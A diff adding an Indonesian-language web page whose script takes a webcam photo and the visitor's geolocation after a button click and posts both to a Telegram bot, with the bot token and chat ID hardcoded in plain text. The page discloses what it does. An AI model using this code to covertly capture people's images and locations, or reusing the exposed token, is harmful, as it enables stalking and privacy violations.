@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Akses Kamera, Lokasi & Telegram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            background-color: #f4f4f9;
+        }
+        #video, #canvas {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+        button {
+            padding: 12px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            background-color: #007bff;
+            color: white;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .info {
+            margin-top: 15px;
+            padding: 10px;
+            background: #fff;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            width: 100%;
+            max-width: 400px;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Aplikasi Ambil Foto, Lokasi & Telegram</h2>
+    <button id="btnClick">Ambil Foto, Cek Lokasi & Kirim</button>
+
+    <div class="info" id="status">Status: Menunggu interaksi pengguna...</div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // === KONFIGURASI TELEGRAM BOT ===
+        const BOT_TOKEN = '8616650869:AAEfksktRupuMVxSTGznIvM9ZKxXXAvHiuk';
+        const CHAT_ID = '8664741564';
+        // =================================
+
+        const btnClick = document.getElementById('btnClick');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusDiv = document.getElementById('status');
+
+        let capturedDataUrl = "";
+        let locationData = { lat: null, lon: null };
+
+        btnClick.addEventListener('click', async () => {
+            statusDiv.innerHTML = "Status: Meminta izin akses kamera & lokasi...";
+
+            // 1. Ambil Lokasi Terlebih Dahulu
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationData.lat = position.coords.latitude;
+                        locationData.lon = position.coords.longitude;
+                        startCameraAndCapture();
+                    },
+                    (error) => {
+                        statusDiv.innerHTML = "Gagal mengambil lokasi: " + error.message;
+                        // Tetap lanjut meskipun lokasi gagal
+                        startCameraAndCapture();
+                    },
+                    { timeout: 10000 }
+                );
+            } else {
+                startCameraAndCapture();
+            }
+        });
+
+        async function startCameraAndCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                // Tunggu sebentar hingga kamera siap
+                setTimeout(() => {
+                    takeSnapshot();
+                    // Matikan stream kamera setelah foto diambil
+                    stream.getTracks().forEach(track => track.stop());
+                }, 1500);
+
+            } catch (err) {
+                statusDiv.innerHTML = "Gagal mengakses kamera: " + err.message;
+            }
+        }
+
+        function takeSnapshot() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            capturedDataUrl = canvas.toDataURL('image/jpeg');
+
+            statusDiv.innerHTML = "Status: Foto diambil, mengirim ke Telegram...";
+            sendToTelegram();
+        }
+
+        async function sendToTelegram() {
+            try {
+                // Konversi DataURL (Base64) ke Blob agar bisa dikirim sebagai file multipart/form-data
+                const blob = dataURItoBlob(capturedDataUrl);
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+                
+                let caption = "📸 Foto baru dari web!";
+                if (locationData.lat && locationData.lon) {
+                    caption += `\n\n📍 Lokasi:\nLatitude: ${locationData.lat}\nLongitude: ${locationData.lon}\nGoogle Maps: https://maps.google.com/?q=${locationData.lat},${locationData.lon}`;
+                } else {
+                    caption += "\n\n📍 Lokasi: Tidak diizinkan/gagal didapatkan.";
+                }
+                formData.append('caption', caption);
+
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    statusDiv.innerHTML = "<strong>Sukses!</strong> Foto dan lokasi berhasil dikirim ke Telegram.";
+                } else {
+                    statusDiv.innerHTML = "Gagal mengirim ke Telegram: " + result.description;
+                }
+            } catch (err) {
+                statusDiv.innerHTML = "Terjadi kesalahan jaringan: " + err.message;
+            }
+        }
+
+        // Helper untuk mengubah DataURL ke Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+
+</body>
+</html>
